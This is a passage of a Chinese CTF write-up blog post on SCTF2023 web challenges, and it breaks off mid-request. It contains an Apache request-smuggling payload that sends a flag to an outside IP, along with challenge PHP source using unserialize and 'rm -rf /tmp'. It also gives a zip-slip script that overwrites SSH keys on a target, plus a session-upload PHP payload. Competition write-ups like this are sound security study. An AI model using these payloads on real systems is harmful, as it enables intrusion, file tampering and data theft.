@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>SCTF2023 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/sctf2023/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="SCTF2023">
+  <meta property="og:description" content="WEB ezcheck1n 这里一直提示time，year不是2023 ，是2022 ，因为下面的post.jpeg
+Apache 版本2.4.54 最近有个请求走私的洞，nssctf 13也出了这个点
+https://xz.aliyun.com/t/12345根据这文章里的脚本修改一下，去拿2022.php外带出$FLAG,
+确实应该这样想/2023/目录是不能变的他题目里的注释里也写了中间件只能转发2023
+/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0aGET%20/2022.php%3Furl%3D47%2E100%2E196%2E3%3A4444 fumo_backdoor 源码
+&lt;?php error_reporting(0); ini_set(&#39;open_basedir&#39;, __DIR__.&#34;:/tmp&#34;); define(&#34;FUNC_LIST&#34;, get_defined_functions()); class fumo_backdoor { public $path = null; public $argv = null; public $func = null; public $class = null; public function __sleep() { if ( file_exists($this-&gt;path) &amp;&amp; preg_match_all(&#39;/[flag]/m&#39;, $this-&gt;path) === 0 ) { readfile($this-&gt;path); } } public function __wakeup() { $func = $this-&gt;func; if ( is_string($func) &amp;&amp; in_array($func, FUNC_LIST[&#34;internal&#34;]) ) { call_user_func($func); } else { $argv = $this-&gt;argv; $class = $this-&gt;class; new $class($argv); } } } $cmd = $_REQUEST[&#39;cmd&#39;]; $data = $_REQUEST[&#39;data&#39;]; switch ($cmd) { case &#39;unserialze&#39;: unserialize($data); break; case &#39;rm&#39;: system(&#34;rm -rf /tmp 2&gt;/dev/null&#34;); break; default: highlight_file(__FILE__); break; } Sycsever 直接运行给的mian文件">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SCTF2023">
+  <meta name="twitter:description" content="WEB ezcheck1n 这里一直提示time，year不是2023 ，是2022 ，因为下面的post.jpeg
+Apache 版本2.4.54 最近有个请求走私的洞，nssctf 13也出了这个点
+https://xz.aliyun.com/t/12345根据这文章里的脚本修改一下，去拿2022.php外带出$FLAG,
+确实应该这样想/2023/目录是不能变的他题目里的注释里也写了中间件只能转发2023
+/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0aGET%20/2022.php%3Furl%3D47%2E100%2E196%2E3%3A4444 fumo_backdoor 源码
+&lt;?php error_reporting(0); ini_set(&#39;open_basedir&#39;, __DIR__.&#34;:/tmp&#34;); define(&#34;FUNC_LIST&#34;, get_defined_functions()); class fumo_backdoor { public $path = null; public $argv = null; public $func = null; public $class = null; public function __sleep() { if ( file_exists($this-&gt;path) &amp;&amp; preg_match_all(&#39;/[flag]/m&#39;, $this-&gt;path) === 0 ) { readfile($this-&gt;path); } } public function __wakeup() { $func = $this-&gt;func; if ( is_string($func) &amp;&amp; in_array($func, FUNC_LIST[&#34;internal&#34;]) ) { call_user_func($func); } else { $argv = $this-&gt;argv; $class = $this-&gt;class; new $class($argv); } } } $cmd = $_REQUEST[&#39;cmd&#39;]; $data = $_REQUEST[&#39;data&#39;]; switch ($cmd) { case &#39;unserialze&#39;: unserialize($data); break; case &#39;rm&#39;: system(&#34;rm -rf /tmp 2&gt;/dev/null&#34;); break; default: highlight_file(__FILE__); break; } Sycsever 直接运行给的mian文件">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/sctf2023/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/vnctf2023/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/python%E6%80%BB%E7%BB%93/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SCTF2023",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/sctf2023\/"
+        },"genre": "posts","keywords": "","wordcount":  670 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/sctf2023\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SCTF2023</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;670 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezcheck1n">ezcheck1n</a></li>
+    <li><a href="#fumo_backdoor">fumo_backdoor</a></li>
+    <li><a href="#sycsever">Sycsever</a></li>
+    <li><a href="#pypyp">pypyp?</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web">WEB</h1>
+<h2 id="ezcheck1n">ezcheck1n</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306190959709.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306190959709.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306190959709.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306190959709.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306190959709.png"
+        title="image-20230619095918086" /></p>
+<p>这里一直提示time，year不是2023 ，是2022 ，因为下面的post.jpeg</p>
+<p>Apache 版本2.4.54 最近有个请求走私的洞，nssctf 13也出了这个点</p>
+<p><a href="https://xz.aliyun.com/t/12345" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/12345</a>
+</p>
+<p>根据这文章里的脚本修改一下，去拿2022.php外带出$FLAG,</p>
+<p>确实应该这样想/2023/目录是不能变的他题目里的注释里也写了中间件只能转发2023</p>
+<pre tabindex="0"><code>/2023/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aUser-Agent:%20curl/7.68.0%0d%0a%0d%0aGET%20/2022.php%3Furl%3D47%2E100%2E196%2E3%3A4444
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191014715.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191014715.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191014715.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191014715.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191014715.png"
+        title="image-20230619101442563" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191015691.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191015691.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191015691.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191015691.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306191015691.png"
+        title="image-20230619101534568" /></p>
+<h2 id="fumo_backdoor">fumo_backdoor</h2>
+<p>源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;open_basedir&#39;</span>, <span style="color:#66d9ef">__DIR__</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;:/tmp&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;FUNC_LIST&#34;</span>, <span style="color:#a6e22e">get_defined_functions</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">fumo_backdoor</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $path <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $argv <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $func <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $class <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __sleep() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>) <span style="color:#f92672">&amp;&amp;</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#39;/[flag]/m&#39;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">readfile</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">path</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup() {
+</span></span><span style="display:flex;"><span>        $func <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">func</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">is_string</span>($func) <span style="color:#f92672">&amp;&amp;</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">in_array</span>($func, <span style="color:#a6e22e">FUNC_LIST</span>[<span style="color:#e6db74">&#34;internal&#34;</span>])
+</span></span><span style="display:flex;"><span>        ) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">call_user_func</span>($func);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $argv <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">argv</span>;
+</span></span><span style="display:flex;"><span>            $class <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">class</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> $class($argv);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$cmd <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>];
+</span></span><span style="display:flex;"><span>$data <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;data&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">switch</span> ($cmd) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;unserialze&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">unserialize</span>($data);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;rm&#39;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;rm -rf /tmp 2&gt;/dev/null&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="sycsever">Sycsever</h2>
+<p>直接运行给的mian文件</p>
+<p>给了几个路由</p>
+<!-- raw HTML omitted -->
+<p>开起了一个8888端口的服务，给了这些路由</p>
+<p>/readfile?file=/etc/passwd  是能读文件，读文件是有长度限制的</p>
+<p>本地访问/admin路由时候，给出报错</p>
+<!-- raw HTML omitted -->
+<p>/home/vanzy/.ssh/id_rsa        存着vanzy用户的ssh私钥</p>
+<p>本地伪造一个 /home/vanzy/.ssh/id_rsa 再运行/admin</p>
+<pre tabindex="0"><code>sudo useradd -m vanzy
+sudo passwd vanzy  创建用户
+su - vanzy 转到vanzy用户
+mkdir -p /home/vanzy/.ssh
+ssh-keygen -t rsa 生成私钥公钥
+</code></pre><!-- raw HTML omitted -->
+<p>2221端口连接失败 ，证明这个可以成功请求到本地的ssh服务</p>
+<p>再继续看/file-unarchiver路由 ，是解压压缩包的功能</p>
+<p>不过这里有个点可以控制被压缩文件名，解压过程进行目录穿越，能够做到文件覆盖</p>
+<p>举例</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> zipfile<span style="color:#f92672">.</span>ZipFile(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;test.zip&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED)
+</span></span><span style="display:flex;"><span>z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;../../../test.txt&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;abcde&#39;</span>)
+</span></span><span style="display:flex;"><span>z<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ip:8888/file-unarchiver&#39;</span>
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> [(<span style="color:#e6db74">&#39;file&#39;</span>, (<span style="color:#e6db74">&#39;test.tar.gz&#39;</span>, open(<span style="color:#e6db74">&#39;test.zip&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;application/zip&#39;</span>))]
+</span></span><span style="display:flex;"><span>resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, files<span style="color:#f92672">=</span>files)
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306192316383.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306192316383.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306192316383.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306192316383.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306192316383.png"
+        title="image-20230619231614328" /></p>
+<p>成功写入文件。</p>
+<p>现在就有个思路，通过解压路由来将题目环境的公钥私钥文件进行覆盖，并且写入命令</p>
+<p>然后访问/admin路由时请求ssh服务，执行命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zipfile
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fuck_priv</span>():
+</span></span><span style="display:flex;"><span>    z <span style="color:#f92672">=</span> zipfile<span style="color:#f92672">.</span>ZipFile(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;priv.zip&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED)
+</span></span><span style="display:flex;"><span>    private_key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./id_rsa&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;../../../../../home/vanzy/.ssh/id_rsa&#39;</span>, private_key)
+</span></span><span style="display:flex;"><span>    z<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> [(<span style="color:#e6db74">&#39;file&#39;</span>, (<span style="color:#e6db74">&#39;priv.zip&#39;</span>, open(<span style="color:#e6db74">&#39;priv.zip&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;application/zip&#39;</span>))]
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, files<span style="color:#f92672">=</span>files)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fuck_pub</span>():
+</span></span><span style="display:flex;"><span>    z <span style="color:#f92672">=</span> zipfile<span style="color:#f92672">.</span>ZipFile(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;pub.zip&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>, zipfile<span style="color:#f92672">.</span>ZIP_DEFLATED)
+</span></span><span style="display:flex;"><span>    public_key <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./id_rsa.pub&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    z<span style="color:#f92672">.</span>writestr(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;../../../../../home/vanzy/.ssh/authorized_keys&#39;</span>, public_key)
+</span></span><span style="display:flex;"><span>    z<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> [(<span style="color:#e6db74">&#39;file&#39;</span>, (<span style="color:#e6db74">&#39;pub.zip&#39;</span>, open(<span style="color:#e6db74">&#39;pub.zip&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>), <span style="color:#e6db74">&#39;application/zip&#39;</span>))]
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, files<span style="color:#f92672">=</span>files)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://119.13.91.238:8888/file-unarchiver&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fuck_priv()
+</span></span><span style="display:flex;"><span>fuck_pub()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://119.13.91.238:8888/admin&#39;</span>
+</span></span><span style="display:flex;"><span>resp_2 <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://119.13.91.238:8888/readfile?file=/home/vanzy/a.txt&#39;</span>
+</span></span><span style="display:flex;"><span>resp_1 <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url1)
+</span></span><span style="display:flex;"><span>print(resp_1<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -rf priv.zip&#39;</span>)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -rf pub.zip&#39;</span>)
+</span></span></code></pre></div><p>私钥公钥文件都覆盖成功，但是命令没有顺利执行，不清楚哪里问题，重新换了个系统生成了公私钥，还是不行</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200150082.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200150082.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200150082.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200150082.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200150082.png"
+        title="image-20230620015030627" /></p>
+<h2 id="pypyp">pypyp?</h2>
+<p>第一步应该是开启session_start()吧</p>
+<p><a href="https://xz.aliyun.com/t/9545" target="_blank" rel="noopener noreffer">https://xz.aliyun.com/t/9545</a>
+</p>
+<p>跟着文章构造个上传页面 上传上去</p>
+<pre tabindex="0"><code>POST / HTTP/1.1
+Host: 115.239.215.75:8081
+Content-Length: 358
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymEq0o60RkRmbFHie
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Cookie: PHPSESSID=whoami
+Referer: http://115.239.215.75:8081/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+
+------WebKitFormBoundarymEq0o60RkRmbFHie
+Content-Disposition: form-data; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;
+
+&lt;?php phpinfo();?&gt;
+------WebKitFormBoundarymEq0o60RkRmbFHie
+Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;pass.php&#34;
